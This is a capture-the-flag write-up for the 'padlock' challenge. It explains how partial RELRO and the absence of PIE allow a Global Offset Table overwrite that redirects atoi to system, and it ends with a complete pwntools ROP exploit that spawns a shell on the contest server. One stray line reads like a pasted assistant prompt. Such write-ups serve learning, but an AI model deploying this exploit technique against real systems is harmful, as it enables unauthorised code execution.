### padlock - Global Offset Table Overwrite

> x Exam (36)

The security mitigation profile of the executable reveals critical structural weaknesses, specifically the combination of an enabled Non-Executable memory protection and disabled Position Independent Executable features, alongside a Partial Relocation Read-Only implementation. The absence of Position Independent Execution ensures that the memory locations of the binary's internal structures remain static and predictable across executions. Furthermore, the Partial Relocation Read-Only setting is the most consequential vulnerability for this specific challenge, as it indicates that the Global Offset Table remains writable after the dynamic linker resolves the required library function addresses.

> The **Global Offset Table** is a critical data structure used by dynamically linked executables to hold the absolute memory addresses of external library functions, which are resolved lazily at runtime and remain writable under Partial RELRO protections, providing a prime target for control flow hijacking.

The established objective for this challenge is to achieve code execution by spawning a shell, yet the restriction against leaking a standard library address necessitates a more sophisticated approach. The program logic relies on the `atoi` function to parse user input, and the binary conspicuously lacks any output functions capable of leaking memory addresses, rendering traditional return-to-libc techniques ineffective. Instead, the strategy must leverage the provided `add [rdi], rsi; ret` custom memory manipulation gadget to perform a relative overwrite.

Because the offset between any two functions within the same compiled standard C library is constant, the exploit can transform an existing function pointer into a target function pointer by adding or subtracting the exact byte difference between them. The mathematical foundation for this technique relies on calculating the relative distance between the target execution function and the currently mapped parsing function, expressed as $\Delta = Address(system) - Address(atoi)$.

By utilizing the custom addition gadget, the exploit will assign the known static address of the `atoi` entry within the Global Offset Table to the `RDI` register, place the calculated $\Delta$ into the `RSI` register, and execute the addition. Consequently, the next time the program attempts to invoke `atoi` to parse the user's input combination, it will unknowingly dereference the modified table entry and execute `system` instead. If the payload simultaneously places the string `"/bin/sh"` into the `.bss` buffer named `vault` and passes it as the argument, the execution environment will successfully transition into an interactive shell.

Please provide the source code for the `padlock` executable, or indicate if the analysis should proceed directly to calculating the library offsets and constructing the Return Oriented Programming chain.

```python
#!/usr/bin/env python3  
from pwn import *  
  
elf = ELF('./padlock', checksec=False)  
libc = ELF('./libc.so.6', checksec=False)  
context.binary = elf  
context.arch = 'amd64'  
  
OFFSET_TO_RIP = 88  
  
HOST = "offsec.m0lecon.it"  
PORT = 13510  
  
pop_rdi_ret = elf.sym.pop_rdi_ret  
pop_rsi_ret = elf.sym.pop_rsi_ret  
add_what_where = elf.sym.add_what_where  
  
atoi_got = elf.got.atoi  
vuln_addr = elf.sym.vuln  
  
  
delta = (libc.sym.system - libc.sym.atoi) & 0xffffffffffffffff  
  
  
  
def conn():  
    if not args.LOCAL:  
        return remote(HOST, PORT)  
    return process(elf.path)  
  
p = conn()  
  
payload = flat(  
    b'A' * OFFSET_TO_RIP,  
    p64(pop_rdi_ret),  
    p64(atoi_got),  
    p64(pop_rsi_ret),  
    p64(delta),  
    p64(add_what_where),  
    p64(vuln_addr)  
)  
  
p.recvuntil(b"combination: ")  
p.sendline(payload)  
  
p.recvuntil(b"combination: ")  
p.sendline(b"/bin/sh\x00")  
  
p.interactive()
```

